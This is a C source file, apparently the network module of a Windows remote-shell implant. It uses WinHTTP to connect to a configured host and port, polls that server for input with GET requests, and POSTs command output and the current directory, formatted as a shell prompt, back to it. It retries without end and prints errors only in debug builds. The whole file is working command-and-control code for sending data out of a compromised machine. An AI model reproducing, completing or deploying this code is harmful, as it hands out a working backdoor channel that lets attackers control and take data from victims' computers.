#include "connection.h"
#include "json/json.h"

#include CONFIG
#include "helper.h"


void initConnection()
{
    while(TRUE)
    {
        hSession = WinHttpOpen(L"HSH", WINHTTP_ACCESS_TYPE_NO_PROXY, 
                                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if(!hSession)
        {
#ifdef DEBUG
            fprintf(stderr, "Init Session Error: %ld\n", GetLastError());
#endif
            continue;
            Sleep(100);
        }

        hConnect = WinHttpConnect(hSession, HOSTNAME, PORT, 0);
        if(!hConnect)
        {
#ifdef DEBUG
            fprintf(stderr, "Init Connection Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hSession);
            continue;
            Sleep(100);
        }
        break;
    }
}


void sendData( char* data , char* curPath)
{
    // Ensure Connection is established
    if(!hConnect)
    {
#ifdef DEBUG
        fputs("Session Not Valid", stderr);
#endif
        initConnection();
    }
    
    LPCWSTR accTypes[] = { L"*/*", 0x00 };

    size_t cwdLen = strlen(curPath) + 3;
    char* cwd = mallocBlock(cwdLen);
    memcpy(cwd, curPath, cwdLen-3);
    cwd[cwdLen-3] = '>';
    cwd[cwdLen-2] = ' ';
    cwd[cwdLen-1] = 0x00;

    JsonNode* root = json_mkobject();

    JsonNode* output = json_mkstring(data);
    JsonNode* getcwd = json_mkstring(cwd);

    json_append_member(root, "output", output);
    json_append_member(root, "getcwd", getcwd);

    char* payload = json_encode(root);

    char* finalDataFmt = "get_data=%s";
    char* finalData = mallocBlock(strlen(finalDataFmt) + strlen(payload) - 1);
    sprintf(finalData, finalDataFmt, payload);

    free(cwd);
    json_delete(root);
    free(payload);

    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";

    BOOL err;

    while( TRUE )
    {

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", PATH,  NULL, 
                                                WINHTTP_NO_REFERER, accTypes, 0);
        if(!hRequest)
        {
#ifdef DEBUG
            fprintf(stderr, "Open Request Error: %ld\n", GetLastError());
#endif
            Sleep(500);
            continue;
        }

        err = WinHttpSendRequest(hRequest, headers, wcslen(headers), finalData, 
                                 strlen(finalData), strlen(finalData), 0);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Send Request Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(2000);
            continue;
        }
    
        err = WinHttpReceiveResponse(hRequest, NULL);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Receive Response Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(500);
            continue;
        }

		DWORD statusCode = 0;
		DWORD statSize = sizeof(statusCode);
        err = WinHttpQueryHeaders(hRequest, 
                                  WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                                  WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statSize, 
                                  WINHTTP_NO_HEADER_INDEX);

#ifdef DEBUG
        if(err != 1)
            fprintf(stderr, "Query Header Error: %ld\n", GetLastError());

        else if(statusCode != 200)
            fprintf(stderr, "Status Code Error : %d\n", statusCode);
#endif

        WinHttpCloseHandle(hRequest);

        if(err != 1 || statusCode != 200)
        {
            Sleep(500);
            continue;
        }

        break;
    }

    free(finalData);
}


char* getData()
{
    // Ensure Connection is established
    if(!hConnect)
    {
#ifdef DEBUG
        fputs("Session Not Valid", stderr);
#endif
        initConnection();
    }

    LPCWSTR accTypes[] = { L"text/html" , 0x00};

    BOOL err;
    char* buffer = NULL;

    while(TRUE)
    {
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, NULL, 
                                                WINHTTP_NO_REFERER, accTypes, 0);
        if(!hRequest)
        {
#ifdef DEBUG
            fprintf(stderr, "Open Request Error: %ld\n", GetLastError());
#endif
            Sleep(500);
            continue;
        }

        err = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Send Request Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(2000);
            continue;
        }

        err = WinHttpReceiveResponse(hRequest, NULL);
        if(err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Receive Response Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(500);
            continue;
        }

        DWORD contentLen = 0;
        DWORD contentLenSize = sizeof(contentLen);
        err = WinHttpQueryHeaders(hRequest, 
                                  WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                                  WINHTTP_HEADER_NAME_BY_INDEX, &contentLen, 
                                  &contentLenSize, WINHTTP_NO_HEADER_INDEX);
        if( err != 1)
        {
#ifdef DEBUG
            fprintf(stderr, "Query Header Error: %ld\n", GetLastError());
#endif
            WinHttpCloseHandle(hRequest);
            Sleep(500);
            continue;
        }
        if( contentLen == 0 )
        {
            buffer = NULL;
            break;
        }

        buffer = mallocBlock(contentLen+1);

        DWORD recieved = 0;
        err = WinHttpReadData(hRequest, buffer, contentLen, &recieved);
#ifdef DEBUG
        if(err != 1)
            fprintf(stderr, "Read Data Error: %ld\n", GetLastError());
        else if(recieved != contentLen)
            fprintf(stderr, "Not Enough Read\n\tContent-Length: %ld\n\tRecieved: %ld\n", 
                    contentLen, recieved);
#endif
        WinHttpCloseHandle(hRequest);

        if( err != 1 || recieved != contentLen)
        {
            free(buffer);
            Sleep(500);
            continue;
        }

        buffer[contentLen] = 0x00;

        break;
    }

    return buffer;
}


void closeSession()
{
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}
